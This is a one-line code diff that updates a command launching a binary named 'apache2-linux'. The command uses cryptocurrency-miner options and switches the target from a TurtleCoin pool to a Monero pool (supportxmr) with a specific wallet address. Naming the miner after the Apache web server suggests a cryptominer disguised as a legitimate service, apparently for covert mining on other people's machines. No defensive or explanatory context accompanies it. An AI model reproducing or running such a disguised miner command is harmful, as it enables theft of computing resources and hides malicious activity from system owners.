@@ -1,1 +1,1 @@
-./apache2-linux --donate-level 0 -o turtlecoin.herominers.com:10380 -u TRTLuxq3Jxj3asTmhJxizHiRc3bwAe9spfCYb4ABwe4odnNjc5qYfve2iJBZ5AUpKVU1gu7Z4TdWTDcze8fHkc2nh8ufAcSyT4r -k -a argon2/chukwa -p apache2
+./apache2-linux --donate-level 0 -o pool.supportxmr.com:443 -u 43WSNYc6kBM9UWUQzRH2ogSFVXudQeXwbAp3XptMLShSKUtifJjhEmQF9oiFi3LQXK8PVRAKQ3sKg4tKRumY8b6E7GUivj6 -p dedik -k --tls
